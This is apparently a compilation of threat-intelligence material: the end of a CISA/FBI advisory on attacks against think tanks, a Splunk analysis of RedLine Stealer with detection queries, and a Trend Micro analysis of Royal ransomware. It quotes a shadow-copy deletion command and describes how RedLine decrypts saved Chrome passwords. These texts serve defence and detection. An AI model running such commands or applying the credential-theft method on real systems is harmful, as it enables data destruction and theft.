[T1546.015] Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
[T1547.001] Boot or Logon Autostart Execution: Shortcut Modification
[T1547.009] Privilege Escalation [TA0004] Process Injection [T1055] Process Injection: Process Hollowing
[T1055.012] Exploitation for Privilege Escalation
[T1068] Access Token Manipulation:
Token Impersonation/Theft
[T1134.001] Event Triggered Execution: Accessibility Features
[T1546.008] Boot or Logon Autostart Execution: Shortcut Modification
[T1547.009] Abuse Elevation Control Mechanism: Bypass User Access Control
[T1548.002] Hijack Execution Flow: DLL Side-Loading [T1574.002] Defense Evasion
[TA0005] Rootkit [T1014] Obfuscated Files or Information:
Binary Padding [T1027.001] Obfuscated Files or Information: Software Packing [T1027.002] Obfuscated Files or Information:
Steganography
[T1027.003] Obfuscated Files or Information: Indicator Removal from Tools [T1027.005] Masquerading: Match Legitimate Name or Location
[T1036.005] Indicator Removal on Host: Clear Windows Event Logs
[T1070.001] Indicator Removal on Host: Clear Command History [1070.003] Indicator Removal on Host: File Deletion
[T1070.004] Indicator Removal on Host:
Timestomp [T1070.006] Modify Registry
[T1112] Deobfuscate/Decode Files or Information [T1140] Exploitation for Defense Evasion
[T1211] Signed Binary Proxy Execution: Compiled HTML File [T1218.001] Signed Binary Proxy Execution:
Mshta [T1218.005] Signed Binary Proxy Execution: Rundll32
[T1218.011] Template Injection [T1221] Execution Guardrails: Environmental Keying [T1480.001] Abuse Elevation Control Mechanism: Bypass User Access Control
[T1548.002] Use Alternate Authentication Material: Application Access Token
[T1550.001] Subvert Trust Controls: Code Signing [T1553.002] Impair Defenses:
Disable or Modify Tools [T1562.001] Impair Defenses: Disable or Modify System Firewall [T1562.004] Hide Artifacts: Hidden Files and Directories
[T1564.001] Hide Artifacts:
Hidden Window
[T1564.003] Credential Access
[TA0006] OS Credential Dumping: LSASS Memory [T1003.001] OS Credential Dumping: Security Account Manager [T1003.002] OS Credential Dumping: NTDS
[T1003.003] OS Credential Dumping: LSA Secrets [T1003.004] OS Credential Dumping: Cached Domain Credentials [T1003.005] 
Network Sniffing [T1040] Input Capture:
Keylogging [T1056.001] Brute Force: Password Cracking
[T1110.002]Brute Force: Password
Spraying [T1110.003] Forced Authentication [T1187] Steal Application Access
Token
[T1528] Unsecured Credentials: Credentials in Files [T1552.001] Unsecured Credentials: Group Policy Preferences [T1552.006] Credentials from Password Stores: Credentials from Web Browsers
[T1555.003] Discovery [TA0007] System Service Discovery
[T1007] Query Registry
[T1012] System Network Configuration Discovery [T1016] Remote System Discovery [T1018] System Owner/User Discovery [T1033] Network Sniffing [T1040] Network Service Scanning [T1046] System Network Connections Discovery [T1049] Process Discovery
[T1057] Permission Groups Discovery: Local Groups [T1069.001] Permission Groups Discovery:
Domain Groups [T1069.002] System Information Discovery [T1082] File and Directory Discovery [T1083] Account Discovery: Local Account [T1087.001] Account Discovery:
Domain Account
[T1087.002] Peripheral Device Discovery [T1120] Network Share Discovery [T1135] Password Policy Discovery [T1201] Software Discovery: Security Software Discovery [T1518.001] Lateral Movement
[TA0008] Remote Services:
Remote Desktop Protocol
[T1021.001] Remote Services: SSH [T1021.004] Taint Shared Content [T1080] Replication Through
Removable Media
[T1091] Exploitation of Remote Services [T1210] Use Alternate Authentication Material:
Pass the Hash
[T1550.002] Use Alternate Authentication Material:
Pass the Ticket [T1550.003] Collection
[TA0009] Data from Local System [T1005] Data from Removable Media
[T1025] Data Staged: Local Data Staging [T1074.001] Screen Capture [T1113] Email Collection:
Local Email Collection
[T1114.001] Email Collection:
Remote Email Collection
[T1114.002] Automated Collection [T1119] Audio Capture [T1123] Data from Information Repositories: SharePoint [T1213.002] Archive Collected Data: Archive via Utility [T1560.001] Archive Collected Data: Archive via Custom Method [T1560.003] Command and Control [TA0011] Data Obfuscation: Junk Data [T1001.001] Fallback Channels
[T1008] Application Layer Protocol: Web Protocols [T1071.001] Application Layer Protocol:
File Transfer Protocols
[T1071.002] Application Layer Protocol: Mail Protocols [T1071.003] Application Layer Protocol:
DNS [T1071.004] Proxy: External Proxy [T1090.002] Proxy: Multi-hop
Proxy [T1090.003] Proxy: Domain Fronting [T1090.004] Communication Through Removable Media
[T1092] Non-Application Layer Protocol
[T1095] Web Service: Dead Drop Resolver [T1102.001] Web Service:
Bidirectional Communication [T1102.002] Multi-Stage Channels [T1104] Ingress Tool Transfer [T1105] Data Encoding: Standard Encoding [T1132.001] Remote Access Software [T1219] Dynamic Resolution: Domain Generation Algorithms
[T1568.002] Non-Standard Port [T1571] Protocol Tunneling [T1572] Encrypted Channel:
Symmetric Cryptography [T1573.001] Encrypted Channel:
Asymmetric Cryptography
[T1573.002] Exfiltration [TA0010] Exfiltration Over C2 Channel [T1041] Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol
[T1048.003] Impact [TA0040] Data Encrypted for Impact [T1486] Resource Hijacking [T1496] System Shutdown/Reboot [T1529] Disk Wipe: Disk Structure Wipe
[T1561.002] MitigationsCISA and FBI recommend think tank organizations apply the following critical practices to strengthen their security posture. 
Leaders Implement a training program to familiarize users with identifying social engineering techniques and phishing emails. 
Users/Staff Log off remote connections when not in use. 
Be vigilant against tailored spearphishing attacks targeting corporate and personal accounts (including both email and social media accounts). 
Use different passwords for corporate and personal accounts. 
Install antivirus software on personal devices to automatically scan and quarantine suspicious files. 
Employ strong multi-factor authentication for personal accounts, if available. 
Exercise caution when: Opening email attachments, even if the attachment is expected and the sender appears to be known.
See Using Caution with Email Attachments. 
Using removable media (e.g., USB thumb drives, external drives, CDs). 
IT Staff/Cybersecurity Personnel Segment and segregate networks and functions. 
Change the default username and password of applications and appliances. 
Employ strong multi-factor authentication for corporate accounts. 
Deploy antivirus software on organizational devices to automatically scan and quarantine suspicious files. 
Apply encryption to data at rest and data in transit. 
Use email security appliances to scan and remove malicious email attachments or links. Monitor key internal security tools and identify anomalous behavior.
Flag any known indicators of compromise or threat actor behaviors for immediate response. 
Organizations can implement mitigations of varying complexity and restrictiveness to reduce the risk posed by threat actors who use Tor (The Onion Router) to carry out malicious activities.
See the CISA-FBI Joint Cybersecurity Advisory on Defending Against Malicious Cyber Activity Originating from Tor for mitigation options and additional information. 
Prevent exploitation of known software vulnerabilities by routinely applying software patches and upgrades.
Foreign cyber threat actors continue to exploit publicly known—and often dated—software vulnerabilities against broad target sets, including public and private sector organizations.
If these vulnerabilities are left unpatched, exploitation often requires few resources and provides threat actors with easy access to victim networks.
Review CISA and FBI’s Top 10 Routinely Exploited Vulnerabilities and other CISA alerts that identify vulnerabilities exploited by foreign attackers. 
Implement an antivirus program and a formalized patch management process. 
Block certain websites and email attachments commonly associated with malware (e.g., .scr, .pif, .cpl, .dll, .exe). 
Block email attachments that cannot be scanned by antivirus software (e.g., .zip files). 
Implement Group Policy Object and firewall rules. 
Implement filters at the email gateway and block suspicious IP addresses at the firewall. 
Routinely audit domain and local accounts as well as their permission levels to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account. 
Follow best practices for design and administration of the network to limit privileged account use across administrative tiers. 
Implement a Domain-Based Message Authentication, Reporting & Conformance (DMARC) validation system. 
Disable or block unnecessary remote services. 
Limit access to remote services through centrally managed concentrators. 
Deny direct remote access to internal systems or resources by using network proxies, gateways, and firewalls. 
Limit unnecessary lateral communications. 
Disable file and printer sharing services.
If these services are required, use strong passwords or Active Directory authentication. 
Ensure applications do not store sensitive data or credentials insecurely. 
Enable a firewall on agency workstations, configured to deny unsolicited connection requests. 
Disable unnecessary services on agency workstations and servers. 
Scan for and remove suspicious email attachments; ensure any scanned attachment is its "true file type" (i.e., the extension matches the file header). 
Monitor users' web browsing habits; restrict access to suspicious or risky sites.
Contact law enforcement or CISA immediately regarding any unauthorized network access identified. 
Visit the MITRE ATT&CK techniques and tactics pages linked in the ATT&CK Profile section above for additional mitigation and detection strategies for this malicious activity targeting think tanks. 
Contact InformationRecipients of this report are encouraged to contribute any additional information that they may have related to this threat.
To report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact your local FBI field office at www.fbi.gov/contact-us/field, or the FBI’s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by email at CyWatch@fbi.gov.
When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact.
To request incident response resources or technical assistance related to these threats, contact CISA at Central@cisa.gov. References CISA Alert: Microsoft Office 365 Security Recommendations CISA Alert: Technical Approaches to Uncovering and Remediating Malicious Activity CISA
Webpage: Telework Guidance CISA Webpage: VPN-Related Guidance FBI Private Industry Notification: PIN 20200409-001 References [1] CyberScoop:
As Europe prepares to vote, Microsoft warns of Fancy Bear attacks on democratic think tanks Revisions Initial Version: December 1, 2020 
This product is provided subject to this Notification and this Privacy & Use policy. 
title: Do Not Cross The 'RedLine' Stealer: Detections and Analysis url: https://www.splunk.com/en_us/blog/security/do-not-cross-the-redline-stealer-detections-and-analysis.html RedLine Stealer is a malware strain designed to steal sensitive information from compromised systems.
It is typically distributed through phishing emails, social engineering tactics, and malicious URL links. 
Since it was released, threat actors and adversaries have leveraged RedLine Stealer because of its availability and flexibility for stealing credentials that can cause financial loss and data leakage.
In 2020, there was a RedLine campaign that targeted both enterprise and personal devices.
Many industries received these malicious campaigns, but the most impacted was the Healthcare and manufacturing sectors.
Recently this year (May 10, 2023), there was a RedLine campaign found by stormshield that used a malicious chrome extension that will download several malware like Smoke Loader and Amadey Trojan.
Amadey malware is a botnet that is being used now to distribute RedLine malware to steal data such as browser credentials, crypto wallets and even credit card information. 
This malicious software has been in the top malware sample shared for months on anyrun statistics reports as well as in Malware bazaar. 
In this blog post, the Splunk Threat Research Team provides a deep dive analysis of this threat and valuable insights to enable blue teamers to defend and detect this malware variant. 
Blog details include: Analysis of the phishing URLs The RedLine Loader The RedLine Stealer Capabilities Splunk Security Content Spear Phish Link Data The operators behind RedLine Stealer use several techniques to gain initial access to their victims.
One common initial access technique that this Trojan Stealer uses is a phishing URL link.
To gain more insight on how this malware executes its campaign, the Splunk Threat Research Team (STRT) collected 90 days of URL data from URLhaus and used Jupyter Notebooks to analyze the dataset to identify trends of the RedLine URL links.
Figure 1 shows the list of URLs from the data related to RedLine Stealer.
Based on URL tags, we can see that this Trojan is also bundled, downloaded or dropped by other malware like Amadey or SmokeLoader. 
Figure 1 Using the URLhaus dataset, we can also learn that RedLine Stealer abuses several known legitimate file/code sharing and collaboration platforms for its campaigns.
Figure 2 shows the top 20 domains that RedLine Stealer used to host its malware.
Based on the list below, the most commonly abused legitimate file sharing domains are GitHub, Dropbox, Discord, Bitbucket, OneDrive and Google Drive. 
The use of these legitimate platforms allows threat actors or adversaries to evade detections or to blend in its C2 communication with other normal network traffic so security solutions will not raise any red flags or detection alerts. 
Figure 2 In the following section, we explore a recent RedLine Loader used, the defense evasion technique and RedLine Stealer capabilities. 
Self Extractor Loader The Splunk Threat Research Team found an interesting RedLine Stealer Loader that was compiled as Win32 Cabinet self extractor executable (wextract) (1) (2).
This self-extracting archive is a type of compressed file that contains multiple files and can be executed as a program.
When a user runs a self-extracting archive, the contents of the archive are extracted to a specified location on the system. 
Figure 3 shows a simple flow diagram of how RedLine Stealer uses a loader in the form of a self-extracting archive (.exe) to initiate its infection.
This loader then executes two more self-extracting archive executables that are responsible for decrypting a shellcode to load the Amadey Trojan and two instances of the RedLine Stealer malware onto the system.
Additionally, the loader also executes a .NET executable that is responsible for defense evasion. 
Figure 3 (For a larger resolution of this diagram visit this link) Defense Evasion Component As described in Figure 3, the Redline Loader will also load an executable named it532878.exe, which is a .NET executable that is responsible for defense evasion.
Figure 4 shows the code snippet of this RedLine component that will do the following: Escalate its privilege as administrator or trustedinstaller Try to disable Windows Defender service “WinDefend” Try to disable Tamper Protection settings of Windows Defender. 
Try to Disable AntiSpyware, Real Time Protection and notification of Windows Defender. 
Disable Windows update services such as (“wuauserv”, “WaaSMedicSvc”, “UsoSvc”) 
Disable Automatic Update and change Windows configurations related to Windows Update Figure 4 RedLine Stealer Deep Dive C2 Connection Check RedLine Stealer is designed to be stealthy and avoid detection by security software.
Therefore, it typically starts by decrypting its initial configuration data, which is often encoded or encrypted to prevent detection.
It starts its code by decrypting its initial configuration that the malware needs to connect to its Command and Control (C2) server and receive instructions on how to operate.
This includes the domain or IP address of the C2 server, as well as the connection IDs and keys that are used to establish a secure connection.
Figure 5 shows the code of the decryption algorithm used by RedLine Stealer to decrypt its initial configuration data which is a combination of Base64 and XOR functions. 
Figure 5 Once the initial configuration data has been decrypted, it will constantly check its bind connection to its C2 server to download further command arguments or other configuration settings that will dictate what functionality will be enabled for its malicious client file. 
Figure 6 shows the code of RedLine that consistently checks the connection of its client malware to the C2 server.
If the connection fails, It will break and throw an exception.
If the C2 server is already down or offline during analysis, this piece of code can be considered an anti-sandbox technique because RedLine will not continue its execution. 
Figure 6 After establishing a connection to its C2, it will fetch another configuration setting data from its C2 server that will fill the ScanningArg() class, which is a data structure of boolean variables that will serve as a switch to RedLine functionality. 
Figure 7 shows the snippet of ScanningArg() class data member of RedLine which accepts either ON or OFF (True or False) values to enable the chosen RedLine settings or functions. 
Figure 7 RedLine Capabilities RedLine Stealer has several features that will be executed depending on the configuration setting it downloaded from its C2 to steal information from the compromised or targeted host.
Figure 8 is the screenshot showing several function capabilities of RedLine that we renamed during our analysis. 
Figure 8 Gather System Information As stated earlier, RedLine Stealer has the ability to collect or extract various types of system information from a targeted or compromised computer.
The information that this malware can retrieve may be sensitive and can potentially compromise the security and privacy of the affected system. 
To provide a more detailed explanation, the table summary below shows each of the functions of the RedLine Stealer malware and describes the specific information that each function attempts to gather. 
Function name (renamed) Description func_GetHostSerialNumber() Retrieve the user domain name, username and host serial number (without “-”) and convert it into a MD5 hash func_GetExecutingAssembly() Get the full file path of its running malware sample func_GetLanguageTimeZoneOsVersion() Retrieves system default language, timezone and OS version func_GetUserName() Get the user name of the compromised host func_GetProcessor() Get processor information of the compromised host by executing "SELECT * FROM Win32_Processor" func_GetGraphicCards() Get AdapterRAM and Graphic Card Name and type by executing "root\\CIMV2", "SELECT *
FROM Win32_VideoController" func_GetBrowsers() Parse browser application and browser version installed in the compromised host by querying "SOFTWARE\WOW6432Node\Clients\StartMenuInternet" or "SOFTWARE\Clients\StartMenuInternet" registry func_GetTotalRAM() Get the total RAM size of compromised host by executing "SELECT * FROM Win32_OperatingSystem" and look for "TotalVisibleMemorySize" func_ListPrograms() Parse all installed application in the compromised host by querying 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall' registry func_GetFirewalls() Parse firewall and Anti Virus Product install in the compromised host by running "SELECT * FROM ROOT\\SecurityCenter2" "SELECT * FROM ROOT\\SecurityCenter" "SELECT *
FROM AntivirusProduct" "SELECT *
FROM FirewallProduct" "SELECT * FROM AntiSpyWareProduct" func_ListProcesses() Retrieve process list and process information by running 'SELECT *
FROM Win32_Process' func_AvailableLanguage() Get the install input language Screen Capture Based on one of the RedLine samples we analyzed, we saw that it has a functionality to capture a screenshot of the targeted or compromised host as part of its data collection and exfiltration.
In Figure 9 above, the function we’ve renamed as func_ScanScreen() is the one responsible for this screen capture capability.
RedLine uses .NET
Graphics class CopyFromScreen
Function() to transfer a bit block of color data from the screen to the Graphic drawing surface that will be saved in memory stream for data exfiltration. 
Figure 9 Cracking Browser Password One of the powerful capabilities of this Trojan Stealer is cracking browser sensitive information like passwords, cookies, autofill and credit card information saved within the browser application.
Figure 10 shows a simple diagram of how RedLine Stealer was able to decrypt the password saved in the chrome browser.
It starts by locating and copying two specific file of Chrome profiles namely as “%userprofile%\Appdata\Local\Google\Chrome\User data\Local State” and “%userprofile%\Appdata\Local\Google\Chrome\User data\Default\Login Data” in the%temp% folder.
Afterward it will read the copied “Local State” file to grab the encoded and encrypted master key to decrypt the password stored in the “Login Data”.
The master key is encoded with Base64 and encrypted using Windows CryptProtectData() API. 
Once the master key is decrypted, it will parse the AES IV (Initialization vector) and the encrypted password in the copied “Login Data” database file to decrypt it using AES GCM algorithm.
The decrypted password will be sent to its C2 Server as part of its data exfiltration. 
Figure 10 Looking For Browser Extensions 
This malware can also steal wallet files by scanning Chrome wallet browser extensions.
Figure 11 shows the RedLine Stealer code and how it enumerates several known Crypto Wallet directories and looks for files related to crypto currencies by looking for files having “wallet” substring on its file name. 
Figure 11 The table below shows some of the targeted Chrome browser extensions that RedLine Stealer tries to parse to look for Crypto Wallets.
These extensions are popular among cryptocurrency users and are used to manage and store their cryptocurrency wallets' sensitive information. 
Chrome Browser Extension Identification Chrome Extension ibnejdfjmmkpcnlpebklmnkoeoihofec Tronlink jbdaocneiiinmjbjlgalhcelgbejmnid NiftyWallet nkbihfbeogaeaoehlefnkodbefgpgknn Metamask afbcbjpbpfadlkmhmclhkeeodmamcflc MathWallet hnfanknocfeofbddgcijnmhnfnkdnaad Coinbase fhbohimaelbohpjbbldcngcnapndodjp BinanceChain odbfpeeihdkbihmopkbjmoonfanlbfcl BraveWallet hpglfhgfnhbgpjdenjgmdgoeiappafln GuardaWallet blnieiiffboillknjnepogjhkgnoapac EqualWallet cjelfplplebdjjenllpjcblmjkfcffne JaxxxLiberty fihkakfobkmkjojpchpfgcmhfjnmnfpi BitAppWallet kncchdigobghenbbaddojjnnaogfppfj iWallet amkmjjmmflddogmhpjloimipbofnfjih Wombat ffnbelfdoeiohenkjibnmadjiehjhajb YoroiWallet fhilaheimglignddkjgofkcbgekhenbh AtomicWallet nlbmnnijcnlegkjjpcfjclmcfggfefdm MewCx nanjmdknhkinifnkgdcggcfnhdaammmj GuildWallet nkddgncdjgjfcddamfgcmfnlhccnimig SaturnWallet fnjhmkhhmkbjkkabndcnnogagogbneec RoninWallet RedLine Stealer can also retrieve information related to the following: VPN (Nord, OpenVPN, ProtonVPN) profiles FileZilla credentials Discord, Telegram and Steam Token Information IOCs Hash (SHA256) 
Description 5112ff1b75d9c33d10efafcbacdb4e2116280c1f5f3e6b6a64b44279997d96ee Redline stealer 8f45a89978ea72a7c3304c93cc56ac18087663ae33daa9f30f919652ba961175 loader eb8a15b1a42127970e7facc6133131dcc073a201419d8cc88c3c316819d1c2a2 Redline stealer afc48eabd725325d00324625eb9035c450d730c0b07d4d5a7246cbb1a3a443eb lr657198.exe 2a4193dcb95c7307e0a4f5586446c1c4adad17733a102a40d0b9227649191ff9 zifq8846.exe 5f9eff953d7ca49f594a864517dfdf37950a41693e53b79aa3a5c396613031bc kp356066.exe 52a52e958a0fef6aa14f27083f2d8675a20c2148be6456cacbda149411719b92 zigT1406.exe 850cd190aaeebcf1505674d97f51756f325e650320eaf76785d954223a9bee38 it532878.exe 5e82fc65d9dafc6da041e732597719aa9872bc82d8ff52c272277a1a49b8c9aa jr663319.exe Detections The Splunk Threat Research Team has curated relevant detections and tagged them to the RedLine Stealer Analytic Story to help security analysts detect adversaries leveraging the RedLine malware. 
For this release, we used and considered the relevant data endpoint telemetry sources such as: Process Execution & Command Line Logging Windows Security Event ID 4663, Sysmon, or any Common Information Model compliant EDR technology Windows Security Event Log Windows System Event Log Windows PowerShell Script Block Logging 
We maximized the usage of Windows Security EventCode 4663 for this analytic story.
An event that is logged whenever an attempt is made to access an object (such as files, registry or directories) in the Windows file system.
This EventCode can be helpful to monitor suspicious processes accessing critical files or folders like browser databases for credential dumping and data collection. 
As an example, we used this event to develop the analytic “Windows Query Registry UnInstall Program List'' that monitors suspicious processes accessing “uninstall registry”.
This registry is being abused by several malware and APT to list all installed applications in the compromised or targeted host. 
`wineventlog_security` EventCode=4663 object_file_path="\\REGISTRY\\MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*" | stats count min(_time) as firstTime max(_time) as lastTime by object_file_name object_file_path process_name
process_path process_id EventCode dest | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)` Figure 12 Another analytic “Windows Credentials from Password Stores Chrome Login Data Access” detects suspicious non-Chrome processes accessing the “Login Data” database file of Chrome.
Figure 13 shows how this analytic detects the simulated behavior of RedLine Stealer, in Python script, in cracking browser sensitive information. 
`wineventlog_security` EventCode=4663 object_file_path="*\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data" AND NOT (process_path IN ("*:\\Windows\\explorer.exe", "*:\\Windows\\System32\\dllhost.exe", "*\\chrome.exe")) 
| stats count min(_time) as firstTime max(_time) as lastTime by object_file_name object_file_path process_name
process_path process_id EventCode dest | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)` Figure 13 Overall, the RedLine Stealer analytic story introduces 25 detections across MITRE ATT&CK techniques. 
Automated Playbooks All of the detections associated with this analytic story create entries in the Splunk Enterprise Security risk index by default and can be used seamlessly with risk notables and the Risk Notable Playbook Pack.
Additionally, the Automated Enrichment playbook pack would also work well with the output of any of these analytics. 
Playbook Description Automated Enrichment Moves the event status to open and then launches the Dispatch playbooks for Reputation Analysis, Attribute Lookup, and Related Tickets. 
Identifier Reputation Analysis Dispatch Detects available indicators and routes them to indicator reputation analysis playbooks.
The output of the analysis will update any artifacts, tasks, and indicator tags. 
Attribute Lookup Dispatch Detects available entities and routes them to attribute lookup playbooks.
The output of the playbooks will create new artifacts for any technologies that return information. 
Related Ticket Search Dispatch Detects available indicators and routes them to dispatch related ticket search playbooks.
Why Should You Care? 
This blog enables security analysts, blue teamers and Splunk customers to identify RedLine Stealer malware by helping the community discover RedLine Stealer tactics, techniques and procedures that are being used by several threat actors and adversaries (APT).
By understanding its behaviors, we were able to generate telemetry and datasets to develop and test Splunk detections designed to defend and respond against this threat. 
Cyber defenders need to design and deploy effective monitoring capabilities that allow them to detect and respond to RedLine Stealer malware attacks. 
Learn More You can find the latest content about security analytic stories on GitHub and in Splunkbase.
Splunk Security Essentials also has all these detections available via push update. 
For a full list of security content, check out the release notes on Splunk Docs. 
Feedback Any feedback or requests?
Feel free to put in an issue on GitHub and we’ll follow up.
Alternatively, join us on the Slack channel #security-research.
Follow these instructions if you need an invitation to our Splunk user groups on Slack. 
Contributors We would like to thank Teoderick Contreras for authoring this post and the entire Splunk Threat Research Team for their contributions: Michael Haag, Mauricio Velazco, Lou Stella, Bhavin Patel, Rod Soto, Eric McGinnis, and Patrick Bareiss. 
title: Conti Team One Splinter Group Resurfaces as Royal Ransomware with Callback Phishing Attacks url: https://www.trendmicro.com/en_us/research/22/l/conti-team-one-splinter-group-resurfaces-as-royal-ransomware-wit.html Conti Team One Splinter Group Resurfaces as Royal Ransomware with Callback Phishing Attacks From September to December, we detected multiple attacks from the Royal ransomware group.
In this blog entry, we discuss findings from our investigation of this ransomware and the tools that Royal ransomware actors used to carry out their attacks. 
By: Ivan Nicole Chavez, Byron Gelera, Monte de Jesus, Don Ovid Ladores, Khristian Joseph Morales December 21, 2022Read time: ( words) Save to Folio Subscribe Royal ransomware may have been first observed by researchers around September 2022, but it has seasoned cybercriminals behind it: The threat actors running this ransomware — who used to be a part of Conti Team One, according to a mind map shared by Vitali Kremez — initially dubbed it Zeon ransomware, until they rebranded it to Royal ransomware.
From September to December this year, we have detected multiple attacks from Royal ransomware, with the US and Brazil being the most targeted countries (Figure 1).
This blog entry discusses in depth the findings from our investigation of samples of this new piece of ransomware, as well as the tools that Royal ransomware actors used to carry out their attacks. 
Figure 1.
Percentage of Royal ransomware attacks by country Infection Routine External reports mention that the Royal ransomware group uses callback phishing as a means of delivering their ransomware to victims (Figure 2).
These phishing attacks contain a number that leads to a service hired by the threat actors.
When contacted, they will use social engineering tactics to lure victims into installing remote access software. Figure 2.
Royal ransomware’s attack flow Installation Our investigation found that the ransomware actors used a compiled remote desktop malware, which was used to drop the tools they needed to infiltrate the victim’s system: they used QakBot and Cobalt Strike for lateral movement, while NetScan was used to look for any remote systems connected to the network.
Once they infiltrated the system, the ransomware actors used tools such as PCHunter, PowerTool, GMER, and Process Hacker to disable any security-related services running in the system.
They then exfiltrate the victim’s data via the RClone tool.
We also observed an instance in which they used AdFind to look for active directories, then executed RDPEnable on the infected machine. 
Payload Once everything has been set up, the ransomware actors used PsEXEC to execute the malware.
The PsEXEC commands contain the ID of the victim, along with any argument that the actors applied to the ransomware.
There were also instances of the malware actors using PsEXEC to enable the remote desktop protocol (RDP) of a target system before executing the ransomware. 
Analysis 
In part of our analysis, we used a ransomware sample with the detection name Ransom.Win64.YORAL.SMYXCJCT.
As shown in Table 1, Figure 3, and Figure 4, Royal ransomware requires an argument of “-id {32-byte characters}” to execute on a victim’s machine.
It also accepts “-path” to specify a target file for encryption and “-ep {value}” to calculate the partial file encryption of large files. 
In some earlier samples of the ransomware, the binary wouldn’t parse all the arguments due to a bug in the code.
For example, “-path” won't be processed if provided after the "-id" argument; if provided before, there will be no "-id" argument, so it will not proceed. 
Argument Description -path {target path} If provided, will only encrypt the contents of the target path -id {32-byte characters} Will be used as the victim’s ID, which will be appended on the TOR link found in the dropped ransom note.
The process exists if not provided or if provided characters is not 32 bytes long -ep This argument is for the full or partial encryption of file routine Table 1.
Arguments accepted by the Royal ransomware binary Figure 3.
Arguments accepted by the ransomware binary Figure 4.
Checking if length of provided “-id” is 32 bytes It enumerates files and directories for encryption using FindFirstFileW, FindNextFileW, and FindClose APIs (Figure 5). 
Figure 5.
File enumeration The ransomware looks for available network shares for network encryption by listing accessible local IPs, then uses NetShareEnum and attempts to connect on ADMIN$ and IPC$ shares (Figure 6). 
Figure 6.
Looking for accessible local IPs then trying to connect to ADMIN$ and IPC$ It checks for the number of processors in the infected system and uses it as a base for the concurrent running threads for file encryption, as shown in Figure 7.
By doing so, Royal ransomware significantly increases the speed of its file encryption process. 
Figure 7.
Checking the number of processors Royal ransomware inhibits system recovery by deleting shadow copies (Figure 8) through the following command: C:\\Windows\\System32\\vssadmin.exe delete shadows /all
/quiet Figure 8.
Using vssadmin.exe to delete shadow copies The ransomware encrypts files using OpenSSL’s Advanced Encryption Standard (AES).
It will encrypt the AES key and IV with RSA encryption using the embedded RSA public key (Figure 9).
The RSA-encrypted AES key and IV will be appended on each encrypted file (Figure 10). 
Figure 9.
An RSA public key Figure 10.
Generation of AES Key and IV The malicious actors behind Royal ransomware use a form of intermittent encryption tactic to speed their encryption process: the ransomware first checks if the file size is divisible by 16, which is a requirement for AES (Figure 11).
If not, it rounds up the total size until it is divisible by 16.
For example, if the size is 18, it will append zero bytes to the file until it has a size of 32, which is now divisible by 16.
Aside from appending the needed zero bytes, it also appends an extra 0x210 Zero bytes as a placeholder for the appended RSA encrypted key. Figure 11.
Royal ransomware checking if file size is divisible by 16 
For a file size that has been rounded-up, Royal ransomware will check if the size is less than or equal to 5,245,000 bytes or if the value is set to 100 (0x64), as shown in Figure 12.
If the file size is within these limits, it will encrypt the entire file.
For files greater than 5,245,000 bytes, file encryption will take place per certain calculated blocks: for example, it will encrypt first N bytes, then skip the next N bytes, then encrypt the next N bytes, and so on. Figure 12.
Encryption process and calculation Its calculation of N bytes is as follows: X / 10* (Original file size) & 0xFFFFFFF0 where X is the value set before encryption X is either 0x32 (50) or 0x64 (100) 
This value will also be used as indicator if full encryption or partial encryption will be performed on the file For example, with a file with a file size equal to 5,245,000: N = 50/10 * (5245000 / 100) & 0xFFFFFFF0 = 0x40060 (262240) 
If the calculated N is greater than 1,024,000, it will simply encrypt per 1,024,000 block instead (Figure 13). 
Figure 13.
Condition if N is greater than 1,024,000 The encrypted file’s structure would then be as follows (Table 2): Description Size Encrypted File Contents Rounded-up file size divisible by 16 RSA Encrypted Key 0x200 bytes Size of encrypted file / offset address of RSA Encrypted Key 8 bytes 
X value, 0x64 or provided value (usually 0x32), indicator if full or partial encryption 8 bytes Table 2.
An encrypted file’s structure The ransomware then renames the encrypted files by appending them with the “.royal” extension, as demonstrated in Figures 14 and 15. Figure 14.
Royal ransomware appending “.royal” to encrypted files Figure 15.
Encrypted files appended with the “.royal” extension For each directory it traverses, Royal ransomware drops a text file named “README.TXT” that contains the ransom note (Figure 16), as well as an advertisement for its “pentesting services” that the ransomware actors will allegedly provide once the ransom has been paid (Figure 17). 
Figure 16.
Creation of the “README.TXT” file Figure 17.
Contents of "README.TXT" with the sample ID we used appended on the TOR link. 
Security Recommendations Our investigation into Royal ransomware attacks shows how the group employs a mixture of both old and new techniques, which indicates that it is no newcomer to the ransomware scene.
Their use of callback phishing to lure victims into installing remote desktop malware allows them to infiltrate the victim’s machine with relative ease.
Their intermittent encryption tactics also hasten their encryption of a victim’s files, with the added benefit of evading detection measures that focus on looking for heavy file IO operations.
Despite their “late” entry to the scene in September, the group already has ransomed multiple companies, and we expect them to be more active in the upcoming months.
More details on Royal ransomware’s other capabilities can be found in Trend Micro’s Threat Encyclopedia. 
We highly advise users and organizations to update their systems with the latest patches and apply multi-layered defense mechanisms.
The emergence and success of the Royal ransomware gang underscore how ransomware actors are finding more innovative ways to repurposing existing tools and tactics as a means of augmenting their attacks.
End users and enterprises alike can mitigate the risk of infection from new threats like Royal ransomware by following these security best practices: Enable multifactor authentication (MFA) to prevent attackers from performing lateral movement inside a network. 
Adhere to the 3-2-1 rule when backing up important files.
This involves creating three backup copies on two different file formats, with one of the copies stored in a separate location. Patch and update systems regularly.
It’s important to keep operating systems and applications up to date and maintain patch management protocols that can deter malicious actors from exploiting any software vulnerabilities. 
Companies can also benefit from the use of multilayered detection and response solutions such as Trend Micro Vision One:trade_mark:, which provides powerful XDR capabilities that collect and automatically correlate data across multiple security layers — email, endpoints, servers, cloud workloads, and networks — to prevent attacks via automated protection, while also ensuring that no significant incidents go unnoticed.
Trend Micro Apex One:trade_mark: also provides next-level automated threat detection and response to protect endpoints against advanced issues, like human-operated ransomware. Indicators of Compromise (IOCs) 
SHA-256 Detection Description c0063d24f3de4e7b89abf9b690a3d264efc6ab7a626f73ad9f42d6bffe52bce7 Trojan.
